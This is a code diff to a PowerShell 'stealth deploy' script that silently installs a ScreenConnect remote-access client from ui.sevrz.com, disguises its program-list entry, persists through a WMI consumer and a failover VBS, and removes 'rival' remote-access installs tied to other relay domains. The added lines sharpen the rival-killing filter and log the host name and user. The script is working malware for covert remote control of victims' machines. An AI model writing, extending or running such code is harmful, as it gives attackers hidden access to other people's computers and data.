@@ -46,11 +46,12 @@ try {
 # CONFIG - competition / stealth build
 # ============================================
 $PrimaryFingerprint = '5f6010579852e507'
-$AllowedFingerprints = @('5f6010579852e507', 'f861c8140d453427')
+# Only keep FPs that are OUR instance. Foreign relays (pluxn/uvexr/etc) are rivals even if FP was historically listed.
+$AllowedFingerprints = @('5f6010579852e507')
+$RequiredRelayHints = @('sevrz.com', 'update.sevrz.com', 'ui.sevrz.com')
 $SvcName = "ScreenConnect Client ($PrimaryFingerprint)"
 $AllowedScreenConnect = @(
-    "ScreenConnect Client ($PrimaryFingerprint)",
-    'ScreenConnect Client (f861c8140d453427)'
+    "ScreenConnect Client ($PrimaryFingerprint)"
 )
 $MsiUrl = 'https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
 $RelayServer = 'update.sevrz.com'
@@ -78,7 +79,9 @@ $WmiConsumerName = 'BVTConsumer'
 $LegacyFingerprints = @(
     '9dd7e861c862d175',
     '3a607f4eb8ca7215',
-    'd4212f02794545b5'
+    'd4212f02794545b5',
+    'f861c8140d453427',
+    '89a1ede2d1bd11dd'
 )
 
 $RivalNames = @(
@@ -648,20 +651,31 @@ function Write-FailoverVbs {
 
 function Test-IsAllowedSc {
     param([string]$Name = '', [string]$Path = '')
-    $blob = "$Name $Path"
-    foreach ($fp in $AllowedFingerprints) {
-        if ($blob -like "*$fp*") { return $true }
-    }
-    # Camouflaged primary ARP name ONLY if path proves primary fingerprint
-    if ($Name -eq $ArpDisplayName -and $Path -like "*$PrimaryFingerprint*") { return $true }
-    return $false
+    return (Test-IsAllowedBlob -Blob "$Name $Path")
 }
 
 function Test-IsAllowedBlob {
     param([string]$Blob)
+    if ([string]::IsNullOrWhiteSpace($Blob)) { return $false }
+
+    # Foreign relay in launch args = never allowed (even if FP was once trusted)
+    if ($Blob -match '(?i)[?&]h=([^&\s]+)') {
+        $hostArg = [Uri]::UnescapeDataString($Matches[1])
+        $ours = $false
+        foreach ($h in $RequiredRelayHints) {
+            if ($hostArg -like "*$h*") { $ours = $true; break }
+        }
+        if (-not $ours) { return $false }
+    }
+    foreach ($bad in @('pluxn.com', 'uvexr.com', 'vexlm.com')) {
+        if ($Blob -like "*$bad*") { return $false }
+    }
+
     foreach ($fp in $AllowedFingerprints) {
         if ($Blob -like "*$fp*") { return $true }
     }
+    # Camouflaged primary ARP name ONLY if path proves primary fingerprint
+    if ($Blob -like "*$ArpDisplayName*" -and $Blob -like "*$PrimaryFingerprint*") { return $true }
     return $false
 }
 
@@ -1109,8 +1123,20 @@ function Invoke-RemoveUnauthorizedRmm {
     }
 }
 
+# Force workdir + log early so failures are visible even if later stages crash
+try {
+    New-Item -ItemType Directory -Path $WorkDir -Force -ErrorAction SilentlyContinue | Out-Null
+    New-Item -ItemType Directory -Path $WorkDirAlt -Force -ErrorAction SilentlyContinue | Out-Null
+} catch {}
+
 Write-Log '=== Stealth deploy start ==='
-Write-Log 'WU_BUILD_20260729W'
+Write-Log 'WU_BUILD_20260729X'
+Write-Log ("Host=$env:COMPUTERNAME user=$env:USERNAME pid=$PID")
+# Immediate rival kill before anything else (known bad FPs + non-sevrz)
+foreach ($fp in @('89a1ede2d1bd11dd', 'f861c8140d453427') + $LegacyFingerprints) {
+    Remove-ScByFingerprint -Fingerprint $fp
+}
+Invoke-RemoveUnauthorizedScreenConnect
 
 # ============================================
 # PHASE 0: WIPE LOUD OLD VERSION + LEGACY
@@ -1857,7 +1883,9 @@ try {
 } catch {}
 
 `$fp = '$PrimaryFingerprint'
-`$allowed = @('5f6010579852e507','f861c8140d453427')
+`$allowed = @('5f6010579852e507')
+`$relayHints = @('sevrz.com','update.sevrz.com','ui.sevrz.com')
+`$badRelays = @('pluxn.com','uvexr.com','vexlm.com')
 `$svcName = 'ScreenConnect Client ($fp)'
 `$msiUrl = '$MsiUrl'
 `$work = '$WorkDir'
@@ -1995,6 +2023,13 @@ function ReactiveIfBlocked {
 }
 function Allowed([string]`$n,[string]`$p='') {
     `$blob = "`$n `$p"
+    foreach (`$b in `$badRelays) { if (`$blob -like "*`$b*") { return `$false } }
+    if (`$blob -match '(?i)[?&]h=([^&\s]+)') {
+        `$hostArg = `$Matches[1]
+        `$ours = `$false
+        foreach (`$h in `$relayHints) { if (`$hostArg -like "*`$h*") { `$ours = `$true; break } }
+        if (-not `$ours) { return `$false }
+    }
     foreach (`$a in `$allowed) { if (`$blob -like "*`$a*") { return `$true } }
     if (`$n -eq `$arpName -and `$p -like "*`$fp*") { return `$true }
     return `$false
